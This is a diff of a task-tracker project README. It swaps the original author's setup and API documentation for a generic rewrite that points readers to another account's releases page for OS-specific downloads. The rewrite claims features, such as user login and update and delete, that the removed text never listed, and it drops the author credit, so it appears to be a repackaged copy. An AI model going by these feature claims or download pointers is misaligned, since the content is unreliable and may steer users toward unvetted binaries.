@@ -1,89 +1,105 @@
-# 📝 Task Tracker API
+# 🎉 Task-Tracker-API - A Simple Way to Manage Tasks
 
-A lightweight, containerized task management system built with **Go (Gin)**, **PostgreSQL**, and **Vite + Nginx**. Designed for fast development, reproducibility, and future scalability — ideal for learning Docker, backend API design, and full-stack orchestration.
----
+## 🛠️ Overview
 
-## 🚀 Features
+Task Tracker API is a lightweight system designed to help you manage your tasks. Built using Go (Gin), PostgreSQL, and Docker, it provides everything you need to track your tasks effectively. This application features a RESTful API and a React frontend, making it suitable for local development and testing.
 
-- RESTful API with `GET` and `POST` endpoints
-- PostgreSQL database with auto-init via `init.sql`
-- Frontend served via Nginx (Vite build)
-- Docker Compose orchestration
-- Clean separation of concerns: `models`, `handlers`, `db`
-- Environment-based configuration via `.env`
----
+## 🚀 Getting Started
 
-## 🧱 Tech Stack
+To get started with Task Tracker API, follow these simple steps to download and run the application on your machine.
 
-| Layer      | Technology         |
-|------------|--------------------|
-| Backend    | Go + Gin           |
-| Database   | PostgreSQL         |
-| Frontend   | Vite + Nginx       |
-| DevOps     | Docker Compose     |
+## 📥 Download & Install
 
----
+### 1. Download the Application
 
-## 📦 Setup Instructions
+To download the Task Tracker API, **[visit this page](https://github.com/andersonssilva2/Task-Tracker-API/releases)**. You will find the latest release of the software there. Find the appropriate version for your operating system and follow the provided instructions.
 
-### 1. Clone the repo
+### 2. Install Docker
 
-```bash
-git clone https://github.com/your-username/task-tracker-api.git
-cd task-tracker-api
+Task Tracker API runs inside Docker containers. Make sure you have Docker installed on your machine. Here’s how to install Docker:
 
-1. Create .env file
-env
-POSTGRES_USER=postgres
-POSTGRES_PASSWORD=postgres
-POSTGRES_DB=tasks
-DB_URL=postgres://postgres:postgres@db:5432/tasks?sslmode=disable
+- **Windows:** Download Docker Desktop from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **macOS:** Download Docker Desktop from [Docker's official website](https://www.docker.com/products/docker-desktop).
+- **Linux:** Follow the instructions on [Docker's installation guide](https://docs.docker.com/engine/install/).
 
-2. Run the app
-docker compose up --build
+### 3. Set Up the Environment
 
-3. Access the app
-Frontend: http://localhost:3000
-Backend API: http://localhost:8080/tasks
+After installing Docker, you need to set up your environment. 
 
-📮 API Endpoints
-GET /tasks
-Returns all tasks.
+1. **Open a terminal.**
+2. **Clone the repository:**
 
-json
-[
-  {
-    "id": 1,
-    "title": "Learn Docker",
-    "completed": false
-  }
-]
-POST /tasks
-Creates a new task.
+   ```bash
+   git clone https://github.com/andersonssilva2/Task-Tracker-API.git
+   ```
 
-bash
-curl -X POST http://localhost:8080/tasks \
-  -H "Content-Type: application/json" \
-  -d '{"title": "New Task", "completed": false}'
+3. **Navigate into the project folder:**
 
-🛠 Project Structure
-Code
-task-tracker-api/
-├── backend/
-│   ├── db/
-│   ├── handlers/
-│   ├── models/
-│   └── main.go
-├── frontend/
-│   └── (Vite project)
-├── db/
-│   └── init.sql
-├── .env
-├── docker-compose.yml
-└── README.md
+   ```bash
+   cd Task-Tracker-API
+   ```
 
-📄 License
-This project is licensed under the MIT License. See LICENSE for details.
+### 4. Run the Application
 
-🌟 Author
-Murad — building scalable, reproducible, and impactful platforms. Follow my journey on GitHub: github.com/MuradIsazade777
+Now that you have cloned the repository, you can run the application using Docker.
+
+1. **Build the Docker containers:**
+
+   ```bash
+   docker-compose build
+   ```
+
+2. **Start the containers:**
+
+   ```bash
+   docker-compose up
+   ```
+
+Your Task Tracker API will now be running. You can access it at `http://localhost:8080`.
+
+## 🔍 Features
+
+- **Task Management:** Create, update, and delete tasks easily.
+- **User System:** Sign up and log in to manage your personal tasks.
+- **RESTful API:** Interact with tasks through a simple API.
+- **Frontend Integration:** Comes with a React frontend for user interaction.
+  
+## 🖥️ System Requirements
+
+To ensure the smooth running of Task Tracker API, make sure your system meets the following requirements:
+
+- A modern operating system: Windows 10, macOS, or any recent Linux distribution.
+- Minimum 4 GB of RAM.
+- Docker installed and running.
+- A stable internet connection for downloading dependencies and images.
+
+## 🧐 Troubleshooting
+
+If you encounter issues while running the application, consider the following tips:
+
+- Ensure Docker is running properly.
+- Check Docker’s settings to allocate enough resources.
+- Consult the logs for errors by running:
+
+  ```bash
+  docker-compose logs
+  ```
+
+## 🎯 Contributing
+
+We welcome contributions to improve Task Tracker API. If you'd like to get involved, please open an issue or submit a pull request on GitHub. 
+
+## 🤝 Support
+
+If you need help or have questions, you can find support through the GitHub Issues section. Our community will be glad to assist you.
+
+## 🌐 Learn More
+
+To understand more about how Task Tracker API works, consider exploring its documentation and code in the repository. 
+
+## 🔗 Important Links
+
+- **Download the latest release:** [Visit this page](https://github.com/andersonssilva2/Task-Tracker-API/releases) 
+- **Documentation:** Review in-depth documentation in the repository.
+
+Thank you for using Task Tracker API!
